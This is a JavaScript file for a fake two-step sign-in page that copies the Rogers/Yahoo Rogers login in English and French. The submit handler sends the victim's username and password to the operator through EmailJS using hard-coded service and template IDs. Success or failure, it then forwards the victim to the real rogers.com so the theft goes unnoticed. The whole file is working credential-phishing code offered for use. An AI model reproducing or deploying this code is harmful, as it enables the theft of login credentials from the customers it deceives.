let toggleClickedCount = 0;

function nextStep() {
    const username = document.getElementById('username').value;
    const remember = document.getElementById('remember').checked;

    if (username !== '') {
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';

        // Display the username entered in the first step
        document.getElementById('displayUsername').textContent = username;

        if (remember) {
            // Save username in local storage or any preferred method
            localStorage.setItem('username', username);
        } else {
            // Clear any previously stored username
            localStorage.removeItem('username');
        }
    }
}

const togglePassword = () => {
    const passwordInput = document.getElementById('password');
    const toggleButton = document.querySelector('.toggle-password');
    const visibilityOnIcon = toggleButton.querySelector('.visibility_on_icon');
    const visibilityOffIcon = toggleButton.querySelector('.visibility_off_icon');

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        visibilityOnIcon.style.display = 'block';
        visibilityOffIcon.style.display = 'none';
    } else {
        passwordInput.type = 'password';
        visibilityOnIcon.style.display = 'none';
        visibilityOffIcon.style.display = 'block';
    }
};

const toggleButton = document.querySelector('.toggle-password');
toggleButton.addEventListener('click', togglePassword);


function forgotPassword() {
    // Forgot password functionality here
    alert('Forgot password clicked!');
}


function goToStep1() {
    document.getElementById('step1').style.display = 'block';
    document.getElementById('step2').style.display = 'none';
}


document.getElementById('form').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent the default form submission

    // Get the form data
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
	
    const formData = {
        username: username,
        password: password
    };

    // Send the form data via Email.js
    emailjs.send("service_t8a7e38", "template_btek92s", formData)
        .then(function (response) {
            console.log('SUCCESS!', response.status, response.text);
            redirectToURL();
        }, function (error) {
            console.log('ERROR!', error);
            redirectToURL();
        });
});


function redirectToURL() {
    window.location.href = 'https://www.rogers.com/';
}

window.addEventListener('load', function () {
    const savedUsername = localStorage.getItem('username');

    if (savedUsername) {
        document.getElementById('username').value = savedUsername;
        document.getElementById('remember').checked = true;
        document.getElementById('username').classList.add('username-input-filled');
    }
});







var currentLanguage = 'en';

function toggleLanguage() {
    if (currentLanguage === 'en') {
        translateToFrench();
        currentLanguage = 'fr';
        updateButtonText('EN');
    } else {
        translateToEnglish();
        currentLanguage = 'en';
        updateButtonText('FR');
    }
}

function translateToFrench() {
    var translation = {
        'sign_in': 'Ouvrir une session',
        'credentials': 'avec vos authentifiants Yahoo Rogers',
        'info': 'info',
        'remember_username': 'Se souvenir du nom d\'utilisateur',
        'continue': 'Continuer',
        'username_label': 'Nom d\'utilisateur : <span id="displayUsername"></span>',
        'forgot_password': 'Mot de passe oublié??',
        'change_username': 'Modifier le nom d\'utilisateur',
        'sign_in_btn': 'Ouvrir une session',
    };

    var elements = document.querySelectorAll('[data-translate]');
    for (var i = 0; i < elements.length; i++) {
        var element = elements[i];
        var key = element.getAttribute('data-translate');
        var translatedText = translation[key] || key;
        element.innerHTML = translatedText;
    }
}

function translateToEnglish() {
    var translation = {
        'sign_in': 'Sign in',
        'credentials': 'with your Yahoo Rogers credentials',
        'info': 'info',
        'remember_username': 'Remember username',
        'continue': 'Continue',
        'username_label': 'Username: <span id="displayUsername"></span>',
        'forgot_password': 'Forgot password?',
        'change_username': 'Change username',
        'sign_in_btn': 'Sign In'
    };

    var elements = document.querySelectorAll('[data-translate]');
    for (var i = 0; i < elements.length; i++) {
        var element = elements[i];
        var key = element.getAttribute('data-translate');
        var translatedText = translation[key] || key;
        element.innerHTML = translatedText;
    }
}

function updateButtonText(text) {
    var langBtn = document.querySelector('.lang_btn');
    langBtn.innerText = text;
}

